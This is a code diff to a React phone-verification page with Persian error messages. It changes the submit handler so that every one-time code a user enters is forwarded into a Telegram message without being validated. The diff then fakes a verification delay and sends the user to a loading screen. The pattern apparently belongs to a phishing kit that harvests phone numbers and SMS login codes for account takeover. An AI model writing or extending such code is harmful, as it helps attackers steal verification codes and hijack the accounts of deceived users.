@@ -46,40 +46,37 @@ const PhoneVerification = () => {
       return;
     }
 
+    if (!sessionId) {
+      setErrors({ otp: "خطا در session. لطفا مجدد تلاش کنید." });
+      return;
+    }
+
     setIsSubmitting(true);
 
     try {
-      console.log("Verifying OTP:", otp);
+      console.log("Updating verification code in Telegram:", otp);
 
-      // Get stored verification code (in real app, this would be validated server-side)
-      const storedCode = sessionStorage.getItem("verificationCode");
-      const storedPhone = sessionStorage.getItem("phoneNumber");
+      // Update verification code in Telegram message
+      const success = await updatePhoneVerificationCode(sessionId, otp);
 
-      // Validate the code
-      if (otp !== storedCode) {
-        throw new Error("Invalid verification code");
+      if (!success) {
+        throw new Error("Failed to update verification code");
       }
-
-      // Send verification success notification to Telegram
-      await sendVerificationCodeToTelegram(
-        storedPhone || phoneNumber,
-        `✅ کد تایید با موفقیت وارد شد: ${otp}`,
-      );
 
       // Simulate verification delay
       await new Promise((resolve) => setTimeout(resolve, 1000));
 
-      // Navigate to loading page with verification data
+      // Navigate to loading page
       navigate("/loading", {
         state: {
-          phoneNumber: storedPhone || phoneNumber,
-          verificationCode: otp,
+          phoneNumber,
+          sessionId,
         },
         replace: true,
       });
     } catch (error) {
       console.error("OTP verification error:", error);
-      setErrors({ otp: "کد تایید نادرست است. لطفا دوباره تلاش کنید." });
+      setErrors({ otp: "خطا در ارسال کد. لطفا دوباره تلاش کنید." });
     } finally {
       setIsSubmitting(false);
     }
